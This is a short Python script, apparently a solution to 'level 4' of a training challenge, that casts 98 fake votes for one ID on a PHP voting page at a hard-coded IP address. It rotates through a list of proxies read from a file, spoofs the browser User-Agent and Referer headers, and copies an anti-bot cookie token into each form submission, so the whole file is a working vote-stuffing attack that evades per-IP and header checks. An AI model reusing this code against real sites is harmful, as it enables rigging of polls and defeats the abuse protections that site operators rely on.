#!/usr/bin/python3

import requests
import sys

# level 4

def get_proxies():
    ip_list = []
    with open('index.html') as fhand:
        for line in fhand:
            line = line.strip()            
            ip_list.append(line)
    return ip_list        


def send_votes():
    url = 'http://158.69.76.135/level4.php'
    string_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
    referer_string = 'http://158.69.76.135/level4.php'
    id = 2500
    times = 98

    for i in range(times):

        ip_list = get_proxies()
        proxy_dict = {'http': 'http://' + ip_list[i]}
        with requests.Session() as s:
            r = s.get(url, proxies=proxy_dict, headers={'User-Agent': string_agent})
            c = r.cookies
            key_form = ""
            for cookie in c:
                if cookie.name == 'HoldTheDoor':
                    key_form = cookie.value
                    break

            l = s.post(url, data={'id': id, 'holdthedoor': 'Enviar', 'key': key_form}, proxies=proxy_dict, headers={'User-Agent': string_agent, 'referer': referer_string}, cookies = c)

send_votes()
